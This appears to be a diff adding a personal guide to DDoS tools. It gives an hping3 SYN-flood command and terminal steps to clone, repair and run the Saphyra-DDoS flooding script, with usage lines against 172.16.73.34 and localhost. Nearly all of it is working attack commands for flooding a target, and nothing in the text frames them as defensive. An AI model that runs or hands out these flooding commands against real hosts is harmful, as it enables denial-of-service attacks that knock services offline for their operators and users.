@@ -1,0 +1,74 @@
+     ================= Saphyra-DDos  =================guide ==============
+      
+      commonly used for ddos 
+                            └─$ sudo hping3 -d 2000 -p 80 -S  --flood 172.16.73.34
+         
+       steps for saphyra ------------------------------
+        
+─(osintgram-env)─(kriz㉿kriz)-[~/ddos-tools]
+└─$ git clone https://github.com/anonymous24x7/Saphyra-DDoS.git
+Cloning into 'Saphyra-DDoS'...
+
+                                                                                                                                                                                                      
+┌──(osintgram-env)─(kriz㉿kriz)-[~/ddos-tools]
+└─$ ls
+Saphyra-DDoS
+                                                                                                                                                                                                      
+┌──(osintgram-env)─(kriz㉿kriz)-[~/ddos-tools]
+└─$ cd Saphyra-DDoS 
+                                                                                                                                                                                                      
+┌──(osintgram-env)─(kriz㉿kriz)-[~/ddos-tools/Saphyra-DDoS]
+└─$ ls
+README.md  saphyra.py
+                                                                                                                                                                                                      
+┌──(osintgram-env)─(kriz㉿kriz)-[~/ddos-tools/Saphyra-DDoS]
+└─$ chmod +x saphyra.py      
+                                                                                                                                                                                                      
+┌──(osintgram-env)─(kriz㉿kriz)-[~/ddos-tools/Saphyra-DDoS]
+└─$ ls
+README.md  saphyra.py
+
+*before runnning file make sure all good
+ 
+This detects any leftover issues:
+┌──(osintgram-env)─(kriz㉿kriz)-[~/ddos-tools/Saphyra-DDoS]
+└─$ python3 -m tabnanny saphyra.py      
+                                                                                                                                                                                        ┌──(osintgram-env)─(kriz㉿kriz)-[~/ddos-tools/Saphyra-DDoS]
+└─$ pip install requests
+
+┌──(osintgram-env)─(kriz㉿kriz)-[~/ddos-tools/Saphyra-DDoS]
+└─$ python3 saphyra.py http://127.0.0.1:8080
+
+*if errors occurs do this to avoid gaps which not allowed in python
+
+┌──(osintgram-env)─(kriz㉿kriz)-[~/ddos-tools/Saphyra-DDoS]
+└─$ sed -i 's/\t/    /g' saphyra.py   
+
+Since Saphyra is an older script, it's likely riddled with legacy tab/space issues. Here’s how to fix it once and for all:
+
+
+┌──(kriz㉿kriz)-[~/ddos-tools/Saphyra-DDoS]
+└─$ expand -t 4 saphyra.py > fixed_saphyra.py && mv fixed_saphyra.py saphyra.py
+
+
+This:
+
+    Converts all tabs to 4 spaces.
+
+    Overwrites the original script cleanly.
+    
+    
+  
+This detects any leftover issues:
+┌──(osintgram-env)─(kriz㉿kriz)-[~/ddos-tools/Saphyra-DDoS]
+└─$ python3 -m tabnanny saphyra.py 
+If nothing prints—your file is clean and good to run.
+
+
+
+tips
+
+python3 saphyra.py [target] [port] [threads]
+python3 saphyra.py 172.16.73.34 80 100
+
+
